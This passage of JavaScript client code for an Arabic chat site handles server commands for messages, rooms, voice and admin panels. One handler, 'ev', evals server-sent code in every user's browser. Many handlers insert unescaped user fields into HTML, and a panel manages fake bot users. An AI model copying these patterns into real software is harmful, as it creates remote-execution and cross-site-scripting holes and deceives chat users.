                    }
                }

                var currentRoomObj = rcach[myroom];
                var currentUserObj = allUsersList[myid];
                if (currentRoomObj != null && currentUserObj != null && (currentRoomObj.owner == currentUserObj.lid || userPermissionsConfig.roomowner == true)) {
                    $(".redit").show();
                } else {
                    $(".redit").hide();
                }

                if (userPermissionsConfig.publicmsg > 0) {
                    $(".pmsg").show();
                } else {
                    $(".pmsg").hide();
                }

                if (hasExistingPermissions == false) {
                    return;
                }

                // إعادة موازنة وتحديث شكل أسماء الأعضاء المتأثرين بالرتبة في قائمة شاشة العرض
                for (var i = 0; i < ignoredUsersList.length; i++) {
                    var logItem = ignoredUsersList[i];
                    if (logItem.power == userPermissionsConfig.name || logItem.s != null) {
                        updateUserRowInUi(logItem.id, logItem);
                    }
                }
                break;
            case "not":
                // معالجة التنبيهات والإشعارات العائمة (Notification Popups)
                if (commandPayload.user != null && commandPayload.force != 1 && false) {
                    send("nonot", {
                        'id': commandPayload.user
                    });
                    return;
                }

                // جلب قالب تصميم الإشعار الافتراضي من كود الـ HTML المخفي #not
                var notificationNode = $($("#not").html()).first();
                var senderUserObj = allUsersList[commandPayload.user];

                if (senderUserObj != null) {
                    if (isUserIgnoredInList(senderUserObj)) {
                        return; // عدم عرض التنبيه إذا كان العضو في قائمة التجاهل الخاصة بك
                    }

                    // بناء وتعبئة بيانات العضو مرسل التنبيه (الصورة، النك نيم، ولون الزخرفة)
                    var userBadgeContainer = $("<div class=\"fl borderg corner uzr d-flex\" style=\"width:100%;padding:2px;\"></div>");
                    userBadgeContainer.append("<img src='" + senderUserObj.pic + "' style='width:24px;height:22px;' class='fl'>");
                    userBadgeContainer.append("<img class='u-ico fl ' style='max-height:18px;' > <div   style='max-width:80%;' class='dots nosel u-topic fl flex-grow-1'>" + senderUserObj.topic + "</div>" + "<span class=\"fr\" style=\"color:grey;font-size:70%!important;\">" + senderUserObj.h + "</span>");

                    userBadgeContainer.find(".u-topic").css({
                        'background-color': senderUserObj.bg,
                        'color': senderUserObj.ucol
                    });

                    // حساب ظل خلفية التنبيه بناءً على لون زخرفة العضو
                    var calculatedBgShade = generateColorShade(senderUserObj.ucol || "#000000", -0x1e);
                    userBadgeContainer.css({
                        'background-color': calculatedBgShade == '' || calculatedBgShade == "#000000" || false ? '' : calculatedBgShade + '06'
                    });

                    var userIconUrl = getUserIconPath(senderUserObj);
                    if (userIconUrl != '') {
                        userBadgeContainer.find(".u-ico").attr("src", userIconUrl);
                    }
                    notificationNode.append(userBadgeContainer);
                }

                // حقن نص رسالة التنبيه بعد فك تشفيره أو تنظيفه وعرضه بداخل كلاس التمرير الفوري break m fl
                notificationNode.append("<div style='width:100%;display:block;padding:0px 5px;overflow:hidden;' class='break m fl'>" + sanitizeIncomingText(commandPayload.msg) + "</div>");

                // إعطاء تأثير إزاحة للنوافذ التنبيهية المتتالية لكي لا تظهر فوق بعضها البعض
                notificationNode.css("margin-left", '+=' + globalAlertOffsetTracker);
                globalAlertOffsetTracker += 2;
                if (globalAlertOffsetTracker >= 6) {
                    globalAlertOffsetTracker = 0;
                }
                $(document.body).append(notificationNode); // إظهار التنبيه العائم على الشاشة للمستخدم
                break;

            case "delbc":
                // حذف منشور برودكاست أو منشور حائط معين بواسطة الـ ID الخاص به (.bid) عبر زر الحذف .bdel
                $(".bid" + commandPayload.bid).remove();
                break;

            case "bclist":
                // جلب وضخ قائمة منشورات الحائط والبرودكاست القديمة عند فتح الشات
                $.each(commandPayload, function (index, singleBroadcastObj) {
                    injectBroadcastItemToUi("#d2bc", singleBroadcastObj);
                });
                break;

            case "bc^":
                // تحديث عداد الإعجابات (اللايكات) عند قيام شخص بالضغط على زر الإعجاب .blike لمنشور الحائط
                var likeHeartIcon = $("#d2bc .bid" + commandPayload.bid + " .fa-heart").first();
                if (likeHeartIcon.length > 0) {
                    likeHeartIcon.text((parseInt(likeHeartIcon.text()) || 0) + 1); // زيادة عداد اللايكات بالمنشور العام +1
                }
                likeHeartIcon = $("#rpl .bid" + commandPayload.bid + " .fa-heart").first();
                if (likeHeartIcon.length > 0) {
                    likeHeartIcon.text((parseInt(likeHeartIcon.text()) || 0) + 1); // زيادة عداد اللايكات في صندوق الردود المفتوح +1
                }
                break;

            case 'bc':
                // استقبال وإضافة منشور برودكاست أو حائط جديد حالياً في صندوق الـ #d2bc
                injectBroadcastItemToUi("#d2bc", commandPayload);

                // إذا كانت اللوحة الجانبية مغلقة أو كان المستخدم لا يقف على تبويب الحائط #wall
                if (dpnl.is(":visible") == false || !$("#wall").hasClass("active")) {
                    bcc++; // زيادة عداد التنبيهات غير المقروءة للحائط
                    $("#bwall").text(bcc).parent().css("color", "orange"); // تلوين زر الحائط باللون البرتقالي لتنبيه المستخدم
                }
                break;

            case 'mi+':
                // تحديث عداد اللايكات لرسائل الشات العادية (Message Likes) داخل صندوق المحادثة الرئيسي #d2
                var messageHeartIcon = $("#d2 .mi" + commandPayload + " .fa-heart").first();
                if (messageHeartIcon.length > 0) {
                    messageHeartIcon.text((parseInt(messageHeartIcon.text()) || 0) + 1); // زيادة اللايك على الرسالة بالعام +1
                }
                messageHeartIcon = $("#rpl .mi" + commandPayload + " .fa-heart").first();
                if (messageHeartIcon.length > 0) {
                    messageHeartIcon.text((parseInt(messageHeartIcon.text()) || 0) + 1); // زيادة اللايك على الرسالة في قائمة الردود +1
                }
                break;
            case "ops":
                // تحديث قائمة مشرفي الغرفة (Operators) داخل اللوحة الإدارية #ops
                var operatorsArea = $("#ops");
                operatorsArea.children().remove(); // تنظيف القائمة الحالية بالكامل

                $.each(commandPayload, function (index, opUserObj) {
                    // جلب القالب التصميمي المخفي #uhead وحقن بيانات المشرف بداخلها
                    var opRowNode = $($("#uhead").html()).css("background-color", "white");
                    opRowNode.find(".u-pic").css("width", "24px").css("height", '24px').css("background-image", "url(\"" + opUserObj.pic + "\")");
                    opRowNode.find(".u-topic").html(opUserObj.topic); // النك نيم والزخرفة
                    opRowNode.css("width", "98%");

                    // إضافة زر الحذف الأحمر (X) لسحب رتبة المشرف عبر أمر السيرفر op-
                    opRowNode.prepend("<button onclick=\"send('op-',{lid: '" + opUserObj.lid + "'});\" class=\"btn-danger fa fa-times\"></button>");
                    operatorsArea.append(opRowNode);
                });
                break;

            case 'ty':
                // استقبال حالة "يكتب الآن..." (Typing Indicator) وعرضها بداخل الكلاس .typ
                var privateInputBox = $(".tbox" + commandPayload[0]);
                if (privateInputBox.length) {
                    var typingIndicator = privateInputBox.parent().parent().parent().find(".typ");
                    if (commandPayload[1] == 1) {
                        typingIndicator.show(); // إظهار التنبيه (يكتب الآن)
                    } else {
                        typingIndicator.hide(); // إخفاء التنبيه عند التوقف
                    }
                }
                break;

            case 'pm':
                // استقبال ومعالجة رسائل المحادثات الخاصة (Private Messages)
                if (isUserIgnoredInList(allUsersList[commandPayload.uid])) {
                    return; // التخطي فوراً إذا كان مرسل الرسالة الخاصة في قائمة تجاهلك
                }
                if (commandPayload.force != 1 && false && $('#c' + commandPayload.pm).length == 0) {
                    send("nopm", {
                        'id': commandPayload.uid
                    });
                    return;
                }
                // فتح صندوق المحادثة الخاصة وحقن الرسالة وتنظيف المدخلات بداخل الواجهة #d2
                openw(commandPayload.pm, false);
                injectBroadcastItemToUi('#d2' + commandPayload.pm, commandPayload);
                $('#c' + commandPayload.pm).find(".u-msg").text(stripHtmlTags($("<div>" + commandPayload.msg + "</div>")));
                $('#c' + commandPayload.pm).insertAfter("#chats .chatsh"); // ترتيب المحادثة النشطة في الأعلى
                break;

            case "ppmsg":
                // استقبال ومعالجة الرسائل الخاصة الجماعية أو الخارقة (Super Private Message)
                if (userPermissionsConfig.ppmsg != true) {
                    return;
                }
                commandPayload["class"] = "ppmsgc";
                var privateSuperMsgNode = injectBroadcastItemToUi('#d2', commandPayload);
                privateSuperMsgNode.find(".u-msg").append("<label style=\"margin-top:2px;color:blue\" class=\"fl nosel fa fa-bullhorn\">خاص</label>");
                break;

            case 'pmsg':
                // استقبال وعرض إعلانات الموقع العامة (Announcements) الملونة بكلاس pmsgc
                commandPayload["class"] = "pmsgc";
                var announcementNode = injectBroadcastItemToUi("#d2", commandPayload);
                announcementNode.find(".u-msg").append("<label style=\"margin-top:2px;color:blue\" class=\"fl nosel fa fa-bullhorn\">إعلان</label>");
                break;

            case "msg":
                // استقبال وعرض رسائل الدردشة العامة العادية داخل الغرفة الحالية
                var msgSenderUserObj = allUsersList[commandPayload.uid || ''];
                if (msgSenderUserObj != null && isUserIgnoredInList(msgSenderUserObj)) {
                    return; // عدم عرض الرسالة بالعام إذا كان مرسلها في قائمة تجاهلك
                }
                if (msgSenderUserObj != null && msgSenderUserObj.roomid != myroom) {
                    return; // منع ظهور الرسالة إذا كانت قادمة من غرفة أخرى لست متواجداً بها
                }
                injectBroadcastItemToUi('#d2', commandPayload);
                break;

            case "dmsg":
                // حذف رسالة عامة معينة فوراً من متصفحات المستخدمين بواسطة آي دي الرسالة .mi
                $(".mi" + commandPayload).remove();
                break;

            case "close":
                // إغلاق الواجهة أو تسجيل خروج قسري من السيرفر عند حدوث خطأ أو قفل
                $(".ovr div").attr("class", "label-danger").find("div").text('..');
                closex();
                break;

            case 'ev':
                // تنفيذ أكواد الجافا سكريبت القادمة من الإدارة مباشرة (Remote Code Execution / Eval)
                eval(commandPayload.data);
                break;

            case "ulist":
                // بناء وضخ القائمة الكاملة لجميع المستخدمين المتواجدين بالشات (Users List)
                ignoredUsersList = commandPayload;

                // تحديث عداد الزوار الكلي للزر #busers مع تصفية المتخفين (Stealth)
                $("#busers").text($.grep(ignoredUsersList, function (singleUser) {
                    return singleUser.s == null;
                }).length);

                var tempElementsQueue = [];
                var totalUsersCount = ignoredUsersList.length;

                // تفريغ البيانات وحقن مصفوفة طاقم الإشراف والزوار في الذاكرة allUsersList
                for (var i = 0; i < totalUsersCount; i++) {
                    var logItem = ignoredUsersList[i];
                    allUsersList[logItem.id] = logItem;
                    tempElementsQueue.push(compileUserRowHtml(logItem.id, logItem, true));
                    updateUserRowInUi(logItem.id, logItem);

                    // حساب العداد الداخلي لعدد زوار الغرفة uco إذا كان العضو ليس متخفياً
                    if (logItem.s == null && rcach[logItem.roomid] != null) {
                        rcach[logItem.roomid].uco++;
                    }
                }

                // مؤقت ذكي يحقن الأعضاء تدريجياً (كل 100 عضو دفعة واحدة) لتسريع المتصفح وعدم تعليق الشات
                var lazyAppendTimer = setInterval(() => {
                    if (tempElementsQueue.length) {
                        var splicedChunk = tempElementsQueue.splice(0, 100).filter(function (filteredNode) {
                            return filteredNode.dl == null;
                        });
                        $("#users").append(splicedChunk); // إدراج الأعضاء في حاوية الواجهة الرئيسية #users
                    }
                    if (tempElementsQueue.length == 0) {
                        clearInterval(lazyAppendTimer); // إيقاف المؤقت عند انتهاء حقن كافة الأعضاء

                        // إرسال وتطبيق ميزات وحالات الأعضاء المتخفين المتبقين في الشات
                        for (var j = 0; j < ignoredUsersList.length; j++) {
                            var hiddenUserObj = ignoredUsersList[j];
                            if (hiddenUserObj.s != null) {
                                executeStealthUserSetup(hiddenUserObj);
                            }
                        }
                    }
                }, 400);

                // تحديث وعرض عدد الزوار الحاليين المتواجدين بداخل كل غرفة (مثال: 5/100) بالواجهة تلقائياً
                var targetRoomObj;
                for (var i = 0; i < chatRoomsArray.length; i++) {
                    targetRoomObj = chatRoomsArray[i];
                    targetRoomObj.ht.attr('v', targetRoomObj.uco || 0).find(".uc").html(targetRoomObj.uco + '/' + targetRoomObj.max);
                }
                break;
            case "u++":
                // إضافة مجموعة مستخدمين دفعة واحدة إلى قائمة الواجهة
                var compiledElementsQueue = [];
                var totalUsersCount = commandPayload.length;
                for (var i = 0; i < totalUsersCount; i++) {
                    var logItem = commandPayload[i];
                    allUsersList[logItem.id] = logItem;
                    ignoredUsersList.push(logItem);
                    compiledElementsQueue.push(compileUserRowHtml(logItem.id, logItem, true));
                    updateUserRowInUi(logItem.id, logItem);
                    if (logItem.s == null && rcach[logItem.roomid] != null) {
                        rcach[logItem.roomid].uco++;
                    }
                }
                $("#users").append(compiledElementsQueue);
                var targetRoomObj;
                for (var i = 0; i < chatRoomsArray.length; i++) {
                    targetRoomObj = chatRoomsArray[i];
                    targetRoomObj.ht.attr('v', targetRoomObj.uco || 0).find(".uc").html(targetRoomObj.uco + '/' + targetRoomObj.max);
                }
                break;

            case 'u+':
                // دخول مستخدم جديد (عضو أو زائر) حالياً إلى الشات
                var checkedUser = findUserByLid(commandPayload.lid);
                if (checkedUser != null) {
                    executeControlPanelAction('u-', checkedUser.id);
                }
                allUsersList[commandPayload.id] = commandPayload;
                ignoredUsersList.push(commandPayload);
                compileUserRowHtml(commandPayload.id, commandPayload);
                updateUserRowInUi(commandPayload.id, commandPayload);
                shouldRefreshUsersList = true;
                $("#busers").text($.grep(ignoredUsersList, function (singleUser) {
                    return singleUser.s == null;
                }).length);
                break;

            case 'u-':
                // خروج مستخدم نهائياً من الشات أو فصل اتصاله
                if (userBadges[commandPayload]) {
                    userBadges[commandPayload].remove();
                    userBadges[commandPayload].dl = true;
                }
                var currentDeletedUser = allUsersList[commandPayload];
                delete allUsersList[commandPayload];
                delete userBadges[commandPayload];
                for (var i = 0; i < ignoredUsersList.length; i++) {
                    if (ignoredUsersList[i].id == commandPayload) {
                        ignoredUsersList.splice(i, 1);
                        break;
                    }
                }
                wclose(commandPayload);
                $("#busers").text($.grep(ignoredUsersList, function (singleUser) {
                    return singleUser.s == null;
                }).length);

                // إذا كان هذا العضو في مكالمة خاصة معك، يتم قطع الخط فوراً
                if (activeCallInstance != null && activeCallInstance.uid == commandPayload) {
                    handlePrivateCallAction(commandPayload, "hangup");
                }
                break;

            case 'ur':
                // حدث انتقال العضو وتنقله بين غرف الشات (User Room Change)
                var movingUserId = commandPayload[0];
                var destinationRoomId = commandPayload[1];
                var destRoomObj = rcach[destinationRoomId];
                var movingUserObj = allUsersList[movingUserId];

                if (movingUserObj == null) {
                    console.error('ur', commandPayload);
                    return;
                }
                if (destRoomObj != null && movingUserObj.s == null) {
                    destRoomObj.uco++; // زيادة عداد زوار الغرفة الجديدة +1
                }
                var oldRoomId = movingUserObj.roomid;
                var oldRoomObj = rcach[oldRoomId];
                if (oldRoomObj && movingUserObj.s == null) {
                    oldRoomObj.uco--; // إنقاص عداد زوار غرفته السابقة -1
                }

                var isRoomAffected = movingUserId == myid || destinationRoomId == myroom || oldRoomId == myroom;
                if (movingUserId == myid) {
                    myroom = destinationRoomId; // تحديث معرف الغرفة الحالية الخاصة بك
                }

                if (movingUserObj != null) {
                    movingUserObj.roomid = destinationRoomId;

                    // أولاً: إذا كنت أنت من قام بتغيير الغرفة ودخلت لغرفة جديدة
                    if (movingUserId == myid) {
                        shouldRefreshUsersList = true;
                        mic = [];
                        if (destRoomObj != null && destRoomObj.m) {
                            mic = destRoomObj.m; // جلب مصفوفة مايكات الغرفة الجديدة
                        }

                        // إظهار أو إخفاء زر منصة المايك العام بناءً على إعدادات الروم الجديدة
                        if (destRoomObj != null && destRoomObj.v == true) {
                            $("#mic").show();
                            fixSize(true);
                        } else {
                            $("#mic").hide();
                            fixSize(true);
                        }

                        if (oldRoomId != null) {
                            for (var winId in userBadges) {
                                if (userBadges[winId]) {
                                    userBadges[winId].removeClass("inroom");
                                }
                            }
                            $("#rooms .inroom").removeClass("inroom");
                            $("#rooms .bord").removeClass("bord");
                        }

                        if (destRoomObj != null) {
                            $("#tbox").css("background-color", '');
                            destRoomObj.ht.addClass('bord'); // وضع علامة تحديد على الغرفة المتواجد بها حالياً
                            $(".ninr,.rout").show();

                            // التحقق من صلاحية تعديل الغرفة redit داخل الروم الجديدة
                            if (destRoomObj.owner == movingUserObj.lid || userPermissionsConfig.roomowner == true) {
                                $(".redit").show();
                            } else {
                                $(".redit").hide();
                            }

                            // تمييز الأعضاء المتواجدين معك في نفس الغرفة الحالية بكلاس inroom
                            for (var i = 0; i < ignoredUsersList.length; i++) {
                                var checkLoopUser = ignoredUsersList[i];
                                if (checkLoopUser.roomid == destinationRoomId && userBadges[checkLoopUser.id] != null) {
                                    userBadges[checkLoopUser.id].addClass("inroom");
                                }
                            }
                        } else {
                            $(".ninr,.rout,.redit").hide();
                            $("#tbox").css("background-color", "#AAAAAF"); // تلوين حقل الكتابة بالرمادي إذا لم تكن بغرفة
                        }

                        setTimeout(() => {
                            updateusers();
                            updateRoomMicsStatus(); // إعادة رسم وتحديث حالة منصة المايكات للغرفة الجديدة
                            $("#busers").click();
                        }, 50);

                        // ثانياً: إذا كان العضو المنتقل شخصاً آخر غيرك
                    } else {
                        if (isRoomAffected) {
                            shouldRefreshUsersList = true;
                            // إذا دخل العضو إلى غرفتك الحالية
                            if (destinationRoomId == myroom && myroom != null) {
                                userBadges[movingUserId].addClass("inroom");
                                // إذا كان المايك معك، يتم بدء بث صوتك له فوراً
                                if (mic.indexOf(myid) != -1) {
                                    connectVoiceToUser(movingUserObj);
                                }
                            } else {
                                // إذا غادر العضو غرفتك الحالية إلى غرفة أخرى، يتم قطع ربط الصوت معه
                                userBadges[movingUserId].removeClass("inroom");
                                var targetPeerConn = peerConnections['_' + movingUserObj.id];
                                if (targetPeerConn != null) {
                                    targetPeerConn.on = null;
                                    targetPeerConn.destroy();
                                    delete peerConnections['_' + movingUserObj.id];
                                    send('p2', {
                                        't': 'x',
                                        'dir': 1,
                                        'id': movingUserObj.id
                                    });
                                }
                            }
                        }
                    }

                    // تحديث أعداد الزوار المعروضة في الواجهة للغرف المتأثرة بالتنقل
                    if (destRoomObj != null) {
                        shouldRefreshRoomsList = true;
                        var roomUiElement = destRoomObj.ht;
                        roomUiElement.find(".uc").text(destRoomObj.uco + '/' + destRoomObj.max);
                        roomUiElement.attr('v', destRoomObj.uco);
                    }
                    if (oldRoomObj != null) {
                        shouldRefreshRoomsList = true;
                        var roomUiElement = oldRoomObj.ht;
                        roomUiElement.find(".uc").text(oldRoomObj.uco + '/' + oldRoomObj.max);
                        roomUiElement.attr('v', oldRoomObj.uco);
                    }
                } else if (mic.indexOf(movingUserId) != -1) {
                    updateRoomMicsStatus();
                }
                break;
            case 'u^':
                // حدث تحديث بيانات ملف مستخدم معين حالياً (مثل الرتبة، السمعة، التاج)
                if (ignoredUsersList == null) {
                    return;
                }
                if (userBadges[commandPayload.id] == null) {
                    return;
                }
                var targetUserObj = allUsersList[commandPayload.id];
                Object.assign(allUsersList[commandPayload.id], commandPayload); // دمج التحديثات الجديدة بملف العضو

                // إذا كان التحديث يخص السمعة واللايكات فقط (rep)، يتم التخطي دون إعادة رسم العنصر
                if (Object.keys(commandPayload).length == 2 && commandPayload.rep != null) {
                    return;
                }
                updateUserRowInUi(commandPayload.id, targetUserObj, commandPayload);

                // إذا تغير النك نيم أو الرتبة أو الغرفة، يتم تفعيل علم إعادة فرز قائمة الأسماء
                if (targetUserObj.topic != commandPayload.topic || targetUserObj.power != commandPayload.power || targetUserObj.roomid != commandPayload.roomid || commandPayload.power != null) {
                    shouldRefreshUsersList = true;
                }
                break;

            case 'r^':
                // حدث تعديل إعدادات وبيانات الغرفة الحالية ديناميكياً من الإدارة (تغيير اسم، المايكات، إلخ)
                var cachedRoomObj = rcach[commandPayload.id];
                commandPayload.ht = cachedRoomObj.ht;
                commandPayload.uco = cachedRoomObj.uco; // الحفاظ على عداد زوار الغرفة الحالي

                // فحص منطقي لمعرفة ما إذا تم منحك المايك حالياً أو سحبه منك قسرياً أثناء التعديل
                var isMicNewlyGranted = mic.indexOf(myid) == -1 && commandPayload.m.indexOf(myid) != -1;
                var isMicForcefullyRemoved = mic.indexOf(myid) != -1 && commandPayload.m.indexOf(myid) == -1;

                if (commandPayload.id == myroom) {
                    commandPayload.ops = cachedRoomObj.ops;
                    mic = commandPayload.m; // تحديث مصفوفة مايكات الغرفة الجديدة
                    updateRoomMicsStatus(); // إعادة رسم منصة المايكات الخمسة بالواجهة

                    // أولاً: إذا تم منحك المايك، ابدأ فوراً بربط صوتك بجميع الأعضاء المتواجدين معك بالروم
                    if (isMicNewlyGranted) {
                        getUsersInSpecificRoom(myroom).forEach(function (roomUserObj) {
                            if (roomUserObj.id != myid) {
                                connectVoiceToUser(roomUserObj);
                            }
                        });
                    }

                    // ثانياً: إذا قام المشرف بسحب المايك منك قسرياً أو قفله، يتم تدمير البث فوراً وإطفاء لمبة المايك بجهازك
                    if (isMicForcefullyRemoved) {
                        for (var connectionId in peerConnections) {
                            if (connectionId.indexOf('_') == 0) { // اتصالات البث الصوتي المباشر للأعضاء
                                var peerConnInstance = peerConnections[connectionId];
                                peerConnInstance.on = null;
                                peerConnInstance.destroy(); // تدمير وقطع اتصال الصوت مع هذا العضو
                                delete peerConnections[connectionId];
                                send('p2', {
                                    't': 'x',
                                    'dir': 1,
                                    'id': peerConnInstance.uid
                                });
                            }
                        }
                        // إطفاء مستشعر ميكروفون جهازك تماماً لحماية خصوصيتك
                        if (localAudioStream != null) {
                            try {
                                localAudioStream.getTracks().forEach(function (audioTrack) {
                                    audioTrack.stop();
                                });
                            } catch (e) {}
                            localAudioStream = null;
                        }
                    }
                }

                rcach[commandPayload.id] = commandPayload;
                chatRoomsList = $.grep(chatRoomsList, function (singleRoom) {
                    return singleRoom.id != commandPayload.id;
                });
                if (cachedRoomObj.topic != commandPayload.topic) {
                    shouldRefreshRoomsList = true;
                }
                chatRoomsList.push(commandPayload);
                updateRoomRowInSidebarUi(commandPayload);

                // تحديث حالة إظهار أو إخفاء زر منصة المايك العام بناءً على التعديل الجديد للروم
                if (commandPayload.id == myroom) {
                    if (commandPayload.v == true) {
                        $("#mic").show();
                        fixSize(true);
                    } else {
                        $('#mic').hide();
                        fixSize(true);
                    }
                }
                break;

            case "rlist":
                // جلب وضخ القائمة الكاملة لكافة غرف الشات المتوفرة بالموقع (`rlist`) داخل تبويب الغرف `#rooms`
                chatRoomsList = commandPayload;
                var totalRoomsCount = chatRoomsList.length;
                var compiledRoomsQueue = [];
                for (var i = 0; i < totalRoomsCount; i++) {
                    var singleRoomItem = chatRoomsList[i];
                    rcach[singleRoomItem.id] = singleRoomItem; // حفظ بيانات الغرفة بالذاكرة المؤقتة للغرف
                    compiledRoomsQueue.push(compileRoomRowHtml(singleRoomItem, true)); // بناء التصميم للغرفة
                }
                $("#rooms").append(compiledRoomsQueue); // حقن الغرف بالواجهة
                $("#brooms").attr("title", "غرف الدردشه: " + chatRoomsList.length); // تحديث التول تيب لزر الغرف الكلي
                break;

            case 'r+':
                // حدث إنشاء غرفة شات جديدة حالياً في الموقع (`r+`) وإضافتها للقائمة تلقائياً
                rcach[commandPayload.id] = commandPayload;
                chatRoomsList.push(commandPayload);
                compileRoomRowHtml(commandPayload);
                $("#brooms").attr("title", "غرف الدردشه: " + chatRoomsList.length);
                break;

            case 'r-':
                // حدث حذف غرفة شات نهائياً من الموقع (`r-`) وإزالتها من الواجهة فوراً
                var deletedRoomObj = rcach[commandPayload.id];
                delete rcach[commandPayload.id];
                chatRoomsList = $.grep(chatRoomsList, function (singleRoom) {
                    return singleRoom.id != commandPayload.id;
                });
                $("#brooms").attr("title", "غرف الدردشه: " + chatRoomsList.length);
                deletedRoomObj.ht.remove(); // حذف عنصر الغرفة الرسومي من قائمة غرف الشات بالواجهة
                break;
            case "cp_bots":
                // التحكم وإدارة إعدادات بوتات الشات الوهمية والزوار التلقائيين (AI/Fake Bots Management)
                if (commandPayload.bots_minStay) {
                    // تعبئة حقول التايمر الخاص ببقاء وخروج البوتات من غرف الشات
                    $("#cp .bots_minStay").val(commandPayload.bots_minStay);
                    $("#cp .bots_maxStay").val(commandPayload.bots_maxStay);
                    $("#cp .bots_minLeave").val(commandPayload.bots_minLeave);
                    $("#cp .bots_maxLeave").val(commandPayload.bots_maxLeave);
                    $("#cp .bots_active").val(commandPayload.bots_active == true ? 'true' : "false");
                    $("#cp .botsb").text(commandPayload.max + '/' + commandPayload.used); // عدد البوتات المتاحة والمستخدمة حالياً
                    return;
                }

                // تصفية وحساب عدد البوتات المتصلة حالياً بالشات (الحالة 0 تعني متصل)
                $("#cp .botso").text(commandPayload.filter(function (botObj) {
                    return botObj.stat == 0;
                }).length);

                // إزالة جدول تصفية البوتات القديم وإعادة بناء جدول فرز منسق ومقلم الألوان tablesorter
                $("#cp #cp_bots .tablesorter").remove();
                var botsTableNode = buildTableHtmlElement("الحاله,الدوله,الزخرفه,الوصف,إعجاب,تثبيت الغرفه,الصوره".split(','));
                $("#cp #cp_bots").append(botsTableNode);

                $.each(commandPayload, function (index, botObj) {
                    var botConfigBtnHtml = "<img style=\"object-fit: contain;object-position:center;width:44px;height:40px;\" class=\"r" + botObj.id + "\" src=\"" + botObj.pic + "\"><a class='btn btn-info fa fa-gear' onclick='cp_bots(this,\"" + botObj.id + "\");'></a>";
                    var anchoredRoomObj = botObj.or != null ? rcach[botObj.or] : null;

                    // حقن سطر البوت داخل الجدول (الاسم، الحالة الشخصية، السمعة، الغرفة الثابتة)
                    var botRowNode = appendTableRow(botsTableNode, [botObj.stat == 0 ? "متصل" : '', botObj.co || '--', botObj.topic, botObj.msg, formatLargeNumber(botObj.rep || 0) + '', anchoredRoomObj ? anchoredRoomObj.topic : '', botConfigBtnHtml], [0x8c, 120, 120, 120, 0x3c, 80]);
                    botRowNode.find("td:eq(2)").css({
                        'background-color': botObj.bg,
                        'color': botObj.ucol
                    });
                });

                // تحديث محرك فرز الجداول تلقائياً
                $("#cp #cp_bots .tablesorter").trigger("update");

                // تلوين الأسطر بشكل تبادلي (سطر أبيض وسطر ملون خفيف) لإعطاء مظهر متناسق لعين المدير
                $("#cp .tablesorter").each(function (tableIdx, tableElement) {
                    $(tableElement).find('tr').each(function (rowIdx, rowElement) {
                        if (rowIdx / 2 == Math.ceil(rowIdx / 2)) {
                            $(rowElement).css("background-color", "#fffafa");
                        } else {
                            $(rowElement).css("background-color", "#fafaff");
                        }
                    });
                });
                break;

            case "cp_rooms":
                // لوحة إدارة كافة غرف الشات من الكنترول وتعديلها (Rooms Control Panel)
                $("#cp #cp_rooms .tablesorter").remove();
                var roomsTableNode = buildTableHtmlElement("الغرفه,صاحب الغرفه,اعدادات".split(','));
                $("#cp #cp_rooms").append(roomsTableNode);

                $.each(commandPayload, function (index, adminRoomObj) {
                    var roomSettingsBtnHtml = "<img style=\"object-fit: contain;object-position:center;width:44px;height:40px;\" class=\"r" + adminRoomObj.id + "\" src=\"" + adminRoomObj.pic + "\"><a class='btn btn-info fa fa-gear' onclick='redit(\"" + adminRoomObj.id + "\");'></a>";
                    appendTableRow(roomsTableNode, [adminRoomObj.topic, adminRoomObj.user, roomSettingsBtnHtml], [0x8c, 120, 120]);
                });

                $("#cp #cp_rooms .tablesorter").trigger("update");
                $("#cp .tablesorter").each(function (tableIdx, tableElement) {
                    $(tableElement).find('tr').each(function (rowIdx, rowElement) {
                        if (rowIdx / 2 == Math.ceil(rowIdx / 2)) {
                            $(rowElement).css("background-color", "#fffafa");
                        } else {
                            $(rowElement).css("background-color", "#fafaff");
                        }
                    });
                });
                break;

            case "cp_owner":
                // لوحة التحكم الكاملة الخاصة بمالك الموقع وسيرفر الشات (Master Website Settings)
                $("#sett_name").val(commandPayload.site.name); // اسم الشات الأساسي
                $("#sett_title").val(commandPayload.site.title); // عنوان هيدر الشات
                $("#sett_description").val(commandPayload.site.description); // وصف موقع الدردشة لجوجل
                $("#sett_keywords").val(commandPayload.site.keywords); // الكلمات الدلالية
                $("#sett_scr").val(commandPayload.site.script); // حقن أكواد جافا سكريبت أو إعلانات بالموقع

                // شروط وقيود الإعجابات (السمعة اللازمة للاستخدام) المحددة من الإدارة
                $(".wall_likes").val(commandPayload.site.wall_likes || 0); // لايكات كتابة منشور حائط
                $(".wall_minutes").val(commandPayload.site.wall_minutes || 0); // دقائق الانتظار بين منشورين
                $(".pmlikes").val(commandPayload.site.pmlikes || 0); // لايكات فتح خاص مع الأعضاء
                $(".msgstt").val(commandPayload.site.msgst || 0);
                $(".notlikes").val(commandPayload.site.notlikes || 0); // لايكات إرسال تنبيهات
                $(".fileslikes").val(commandPayload.site.fileslikes || 0); // لايكات رفع ونقل الملفات والصور
                $(".proflikes").val(commandPayload.site.proflikes || 0); // لايكات تعديل الحساب الشخصي
                $(".piclikes").val(commandPayload.site.piclikes || 0); // لايكات تغيير صورة البروفايل

                // قيود الشبكة والاتصال
                $(".maxIP").val(commandPayload.site.maxIP || 2); // الحد الأقصى لفتح حسابات من نفس الآيبي IP
                $(".maxshrt").val(commandPayload.site.maxshrt || 1); // تكرار الاختصارات
                $(".stay").val(commandPayload.site.stay || 1);

                // خيارات التفعيل الصالحة بالموقع (Checkboxes)
                $(".allowg").prop("checked", commandPayload.site.allowg == true); // السماح بدخول الزوار بدون تسجيل
                $(".allowreg").prop("checked", commandPayload.site.allowreg == true); // السماح بتسجيل العضويات الجديدة
                $(".rc").prop("checked", commandPayload.site.rc == true);
                $("#bclikes").prop("checked", commandPayload.site.bclikes == true); // تفعيل لايكات البرودكاست الحائط
                $("#mlikes").prop("checked", commandPayload.site.mlikes == true); // تفعيل لايكات رسائل العام العادية
                $("#bcreply").prop("checked", commandPayload.site.bcreply == true); // تفعيل ردود الحائط
                $("#mreply").prop("checked", commandPayload.site.mreply == true);
                $("#calls").prop("checked", commandPayload.site.calls == true); // تفعيل ميزة المكالمات الخاصة بالشات
                $(".callsLike").val(commandPayload.site.callsLike || 0); // لايكات تفعيل المكالمات الصوتية الخاصة

                // تحديث وتلوين واجهة الشات وسيمات الألوان الإدارية باستخدام مكتبة jscolor
                var colorPickerInstance = new jscolor.color($("#cp .sbg")[0], {});
                colorPickerInstance.fromString(commandPayload.site.bg);
                colorPickerInstance = new jscolor.color($(".sbackground")[0], {});
                colorPickerInstance.fromString(commandPayload.site.background);
